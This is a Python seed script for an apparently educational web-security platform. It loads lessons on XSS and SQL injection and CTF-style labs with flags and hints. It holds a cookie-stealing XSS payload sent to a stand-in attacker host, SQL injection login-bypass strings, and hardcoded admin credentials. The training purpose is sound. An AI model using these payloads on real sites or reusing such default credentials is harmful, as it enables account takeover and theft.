"""
WebNoX - Database Seed Script
Seeds the database with sample courses, lessons, and labs
"""
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from app import create_app, db
from app.models.user import User
from app.models.course import Course, Lesson
from app.models.lab import Lab
import json

def seed_database():
    app = create_app()
    
    with app.app_context():
        print("🌱 Starting database seed...")
        
        # Create tables
        db.create_all()
        
        # Check if data already exists
        if User.query.first():
            print("⚠️  Database already has data. Skipping seed.")
            return
        
        # Create admin user
        print("👤 Creating admin user...")
        admin = User(
            username='admin',
            email='admin@webnox.local',
            role='admin'
        )
        admin.set_password('admin123')
        db.session.add(admin)
        
        # Create test user
        test_user = User(
            username='student',
            email='student@webnox.local',
            role='student'
        )
        test_user.set_password('student123')
        db.session.add(test_user)
        
        # Create XSS Course
        print("📚 Creating courses...")
        xss_course = Course(
            title='Cross-Site Scripting (XSS) Fundamentals',
            slug='xss-fundamentals',
            description='Learn about Cross-Site Scripting vulnerabilities, from basic concepts to advanced exploitation techniques. Understand how attackers inject malicious scripts and how to defend against them.',
            difficulty='beginner',
            category='XSS',
            duration_minutes=120,
            points=150,
            order=1,
            is_published=True
        )
        db.session.add(xss_course)
        db.session.flush()
        
        # XSS Lessons
        xss_lessons = [
            {
                'title': 'Introduction to XSS',
                'slug': 'introduction',
                'order': 1,
                'duration_minutes': 15,
                'content': '''
<h2>What is Cross-Site Scripting (XSS)?</h2>
<p>Cross-Site Scripting (XSS) is a type of security vulnerability typically found in web applications. XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users.</p>

<h3>How XSS Works</h3>
<p>An XSS vulnerability occurs when a web application includes untrusted data in a web page without proper validation or escaping. This allows attackers to execute scripts in the victim's browser, which can:</p>
<ul>
    <li>Steal session cookies and authentication tokens</li>
    <li>Redirect users to malicious websites</li>
    <li>Modify the content of the web page</li>
    <li>Capture keystrokes and form data</li>
</ul>

<h3>Types of XSS</h3>
<p>There are three main types of XSS attacks:</p>
<ol>
    <li><strong>Reflected XSS</strong> - The malicious script comes from the current HTTP request</li>
    <li><strong>Stored XSS</strong> - The malicious script is stored on the target server</li>
    <li><strong>DOM-based XSS</strong> - The vulnerability exists in client-side code rather than server-side</li>
</ol>

<div class="alert alert-info">
    <strong>💡 Key Takeaway:</strong> XSS is one of the most common web vulnerabilities and is listed in the OWASP Top 10.
</div>
'''
            },
            {
                'title': 'Reflected XSS',
                'slug': 'reflected-xss',
                'order': 2,
                'duration_minutes': 20,
                'content': '''
<h2>Reflected XSS Attacks</h2>
<p>Reflected XSS occurs when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.</p>

<h3>Example Vulnerable Code</h3>
<pre><code class="language-php">&lt;?php
// Vulnerable PHP code
echo "Hello, " . $_GET['name'];
?&gt;</code></pre>

<h3>Attack Example</h3>
<p>An attacker could craft a malicious URL:</p>
<pre><code>https://vulnerable-site.com/greet?name=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>

<h3>Impact</h3>
<p>When a victim clicks the link, the script executes in their browser context, potentially allowing the attacker to:</p>
<ul>
    <li>Steal cookies: <code>document.cookie</code></li>
    <li>Capture credentials</li>
    <li>Perform actions on behalf of the user</li>
</ul>

<h3>Prevention</h3>
<p>Always encode user input before reflecting it:</p>
<pre><code class="language-php">&lt;?php
// Secure PHP code
echo "Hello, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
?&gt;</code></pre>
'''
            },
            {
                'title': 'Stored XSS',
                'slug': 'stored-xss',
                'order': 3,
                'duration_minutes': 20,
                'content': '''
<h2>Stored XSS Attacks</h2>
<p>Stored XSS (also known as Persistent XSS) occurs when an application stores user-supplied data and later includes it in responses without proper encoding.</p>

<h3>Common Locations</h3>
<ul>
    <li>Comment sections and forums</li>
    <li>User profile fields</li>
    <li>Product reviews</li>
    <li>Chat messages</li>
</ul>

<h3>Why It's More Dangerous</h3>
<p>Stored XSS is generally more severe than reflected XSS because:</p>
<ul>
    <li>The payload is stored permanently</li>
    <li>Every user who views the page is affected</li>
    <li>No special link is required for exploitation</li>
</ul>

<h3>Example Attack Scenario</h3>
<p>1. Attacker posts a comment containing malicious script:</p>
<pre><code>&lt;script&gt;fetch('https://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</code></pre>

<p>2. The comment is stored in the database</p>
<p>3. Every user viewing that page executes the script</p>

<div class="alert alert-danger">
    <strong>⚠️ Warning:</strong> Stored XSS can lead to account takeover, data theft, and malware distribution.
</div>
'''
            }
        ]
        
        for lesson_data in xss_lessons:
            lesson = Lesson(
                course_id=xss_course.id,
                **lesson_data
            )
            db.session.add(lesson)
        
        # Create SQL Injection Course
        sqli_course = Course(
            title='SQL Injection Attacks',
            slug='sql-injection',
            description='Master SQL Injection techniques and learn how to identify, exploit, and prevent database vulnerabilities in web applications.',
            difficulty='intermediate',
            category='SQL Injection',
            duration_minutes=180,
            points=200,
            order=2,
            is_published=True
        )
        db.session.add(sqli_course)
        db.session.flush()
        
        # SQLi Lessons
        sqli_lessons = [
            {
                'title': 'Introduction to SQL Injection',
                'slug': 'introduction',
                'order': 1,
                'duration_minutes': 20,
                'content': '''
<h2>What is SQL Injection?</h2>
<p>SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in applications that construct SQL queries using user input.</p>

<h3>How It Works</h3>
<p>When an application builds SQL queries by concatenating user input, an attacker can modify the query's logic:</p>
<pre><code class="language-sql">-- Vulnerable query
SELECT * FROM users WHERE username = '$username' AND password = '$password'

-- Attacker input: admin' --
SELECT * FROM users WHERE username = 'admin' --' AND password = ''</code></pre>

<h3>Types of SQL Injection</h3>
<ul>
    <li><strong>In-band SQLi</strong> - Results are returned directly in the response</li>
    <li><strong>Blind SQLi</strong> - No visible output, infer data through behavior</li>
    <li><strong>Out-of-band SQLi</strong> - Data exfiltration through alternative channels</li>
</ul>
'''
            }
        ]
        
        for lesson_data in sqli_lessons:
            lesson = Lesson(
                course_id=sqli_course.id,
                **lesson_data
            )
            db.session.add(lesson)
        
        # Create Labs
        print("🔬 Creating labs...")
        labs = [
            {
                'title': 'Reflected XSS - Basic',
                'slug': 'xss-reflected-basic',
                'description': 'Your first XSS challenge. Find and exploit a reflected XSS vulnerability to capture the flag.',
                'instructions': '''
<h3>Objective</h3>
<p>Find and exploit a reflected XSS vulnerability in the search functionality.</p>

<h3>Background</h3>
<p>The target application has a search feature that reflects user input without proper sanitization. Your goal is to inject JavaScript that will reveal the hidden flag.</p>

<h3>Steps</h3>
<ol>
    <li>Navigate to the search page</li>
    <li>Test the search field for XSS vulnerabilities</li>
    <li>Craft a payload that executes JavaScript</li>
    <li>Use the browser console or an alert to find the flag</li>
</ol>

<h3>Hints</h3>
<ul>
    <li>Start with a simple <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> payload</li>
    <li>Check the page source to see how your input is reflected</li>
    <li>The flag is stored in a hidden element on the page</li>
</ul>

<div class="alert alert-info">
    <strong>Flag Format:</strong> FLAG{...}
</div>
''',
                'difficulty': 'beginner',
                'category': 'XSS',
                'vulnerability_type': 'Reflected XSS',
                'points': 50,
                'flag': 'FLAG{xss_r3fl3ct3d_b4s1c}',
                'hints': json.dumps([
                    "Try entering HTML tags in the search box",
                    "Look for where your input appears in the page source",
                    "The flag might be in a hidden div with id='secret-flag'"
                ]),
                'order': 1,
                'is_active': True
            },
            {
                'title': 'Stored XSS - Comment Section',
                'slug': 'xss-stored-comments',
                'description': 'Exploit a stored XSS vulnerability in a comment system to steal session data.',
                'instructions': '''
<h3>Objective</h3>
<p>Inject a persistent XSS payload into the comment section that will execute for all users viewing the page.</p>

<h3>Challenge</h3>
<p>The blog allows users to post comments. The comments are stored and displayed to all visitors. Your goal is to inject a script that extracts the admin's session information.</p>

<h3>Target</h3>
<ul>
    <li>Post a comment containing your XSS payload</li>
    <li>The payload should execute when the page loads</li>
    <li>Extract the flag from the admin session</li>
</ul>
''',
                'difficulty': 'intermediate',
                'category': 'XSS',
                'vulnerability_type': 'Stored XSS',
                'points': 100,
                'flag': 'FLAG{st0r3d_xss_p3rs1st3nt}',
                'hints': json.dumps([
                    "Comments are not sanitized before storage",
                    "Try using event handlers like onerror",
                    "Check document.cookie for the flag"
                ]),
                'order': 2,
                'is_active': True
            },
            {
                'title': 'SQL Injection - Login Bypass',
                'slug': 'sqli-login-bypass',
                'description': 'Bypass authentication using SQL injection to access the admin panel.',
                'instructions': '''
<h3>Objective</h3>
<p>Use SQL injection to bypass the login form and access the admin account.</p>

<h3>Background</h3>
<p>The login form is vulnerable to SQL injection. The application uses a simple query to validate credentials:</p>
<pre><code>SELECT * FROM users WHERE username='$user' AND password='$pass'</code></pre>

<h3>Your Mission</h3>
<ol>
    <li>Analyze the login form behavior</li>
    <li>Craft an SQL injection payload</li>
    <li>Log in as the admin user</li>
    <li>Find the flag in the admin dashboard</li>
</ol>
''',
                'difficulty': 'beginner',
                'category': 'SQL Injection',
                'vulnerability_type': 'SQL Injection',
                'points': 75,
                'flag': 'FLAG{sql1_l0g1n_byp4ss}',
                'hints': json.dumps([
                    "Try adding a single quote to the username field",
                    "Use -- to comment out the rest of the query",
                    "admin' OR '1'='1 might be useful"
                ]),
                'order': 3,
                'is_active': True
            },
            {
                'title': 'IDOR - User Profile Access',
                'slug': 'idor-profile',
                'description': 'Exploit an Insecure Direct Object Reference vulnerability to access other users\' profiles.',
                'instructions': '''
<h3>Objective</h3>
<p>Access another user's private profile by manipulating the request parameters.</p>

<h3>Scenario</h3>
<p>After logging in, you can view your profile at <code>/profile?id=123</code>. The application doesn't properly verify if you're authorized to view the requested profile.</p>

<h3>Challenge</h3>
<ul>
    <li>Log in with the provided test account</li>
    <li>Find your profile page and note the URL structure</li>
    <li>Access the admin's profile (user ID 1)</li>
    <li>Retrieve the flag from the admin's private notes</li>
</ul>
''',
                'difficulty': 'beginner',
                'category': 'IDOR',
                'vulnerability_type': 'IDOR',
                'points': 50,
                'flag': 'FLAG{1d0r_pr0f1l3_4cc3ss}',
                'hints': json.dumps([
                    "Change the id parameter in the URL",
                    "Admin is usually the first user (ID=1)",
                    "No authentication is needed to access other profiles"
                ]),
                'order': 4,
                'is_active': True
            },
            {
                'title': 'CSRF - Password Change',
                'slug': 'csrf-password',
                'description': 'Craft a CSRF attack to change another user\'s password without their knowledge.',
                'instructions': '''
<h3>Objective</h3>
<p>Create a malicious page that, when visited by the victim, changes their password.</p>

<h3>Vulnerability</h3>
<p>The password change form doesn't include CSRF tokens or verify the referrer header.</p>

<h3>Steps</h3>
<ol>
    <li>Analyze the password change request</li>
    <li>Create an HTML page with a hidden form</li>
    <li>The form should auto-submit when loaded</li>
    <li>Simulate the victim visiting your malicious page</li>
</ol>
''',
                'difficulty': 'intermediate',
                'category': 'CSRF',
                'vulnerability_type': 'CSRF',
                'points': 100,
                'flag': 'FLAG{csrf_p4ssw0rd_ch4ng3}',
                'hints': json.dumps([
                    "Use a hidden form with method POST",
                    "JavaScript can auto-submit the form",
                    "The target endpoint is /change-password"
                ]),
                'order': 5,
                'is_active': True
            }
        ]
        
        for lab_data in labs:
            lab = Lab(**lab_data)
            db.session.add(lab)
        
        # Commit all changes
        db.session.commit()
        print("✅ Database seeded successfully!")
        print("")
        print("📋 Created accounts:")
        print("   Admin: admin@webnox.local / admin123")
        print("   Student: student@webnox.local / student123")
        print("")
        print("🚀 Run the app with: python run.py")

if __name__ == '__main__':
    seed_database()
